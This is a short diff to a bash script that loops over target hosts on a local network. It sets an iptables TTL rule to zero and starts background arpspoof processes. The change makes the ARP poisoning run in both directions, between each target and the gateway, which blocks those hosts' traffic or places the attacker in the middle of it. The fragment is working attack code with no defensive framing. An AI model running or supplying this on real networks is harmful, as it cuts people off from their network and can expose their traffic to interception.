@@ -221,7 +221,9 @@ for TARGET in "${TARGETS[@]}"; do
     iptables -t mangle -I PREROUTING -s "$TARGET" -j TTL --ttl-set 0
     
     # Bidirectional blocking
-   ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
+   ( arpspoof -i "$INTERFACE" -c host -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 ) &
+    PIDS+=($!)
+   ( arpspoof -i "$INTERFACE" -c host -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 ) &
     PIDS+=($!)
 done
 
